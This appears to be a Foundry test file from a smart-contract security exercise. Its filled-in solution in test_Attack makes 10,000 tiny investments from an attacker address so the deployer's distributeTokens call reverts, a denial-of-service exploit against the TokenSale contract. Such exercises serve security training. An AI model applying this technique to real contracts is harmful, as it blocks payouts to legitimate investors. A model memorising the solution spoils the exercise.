// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "src/dos-1/TokenSale.sol";

/**
@dev run "forge test --match-contract DoS1 -vvv" 
*/
contract TestDoS1 is Test {
    TokenSale tokenSale;

    uint constant USER1_INVESTMENT = 5 ether;
    uint constant USER2_INVESTMENT = 15 ether;
    uint constant USER3_INVESTMENT = 23 ether;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(deployer, 10000 ether);
        vm.deal(user1, 10000 ether);
        vm.deal(user2, 10000 ether);
        vm.deal(user3, 10000 ether);
        vm.deal(attacker, 10000 ether);

        vm.prank(deployer);
        tokenSale = new TokenSale();
        // Invest
        vm.prank(user1);
        tokenSale.invest{value: USER1_INVESTMENT}();
        vm.prank(user2);
        tokenSale.invest{value: USER2_INVESTMENT}();
        vm.prank(user3);
        tokenSale.invest{value: USER3_INVESTMENT}();

        assertEq(tokenSale.claimable(address(user1), 0), USER1_INVESTMENT * 5);
        assertEq(tokenSale.claimable(address(user2), 0), USER2_INVESTMENT * 5);
        assertEq(tokenSale.claimable(address(user3), 0), USER3_INVESTMENT * 5);
    }

    function test_Attack() public {
        /** CODE YOUR SOLUTION HERE */
        for (uint i = 0; i < 10000; i++) {
            console.log("Investing %d", i);
            vm.prank(attacker);
            tokenSale.invest{value: 100}();
        }

        /** SUCCESS CONDITIONS */
        // DOS to distributeTokens
        vm.prank(deployer);
        vm.expectRevert();
        tokenSale.distributeTokens();
    }
}
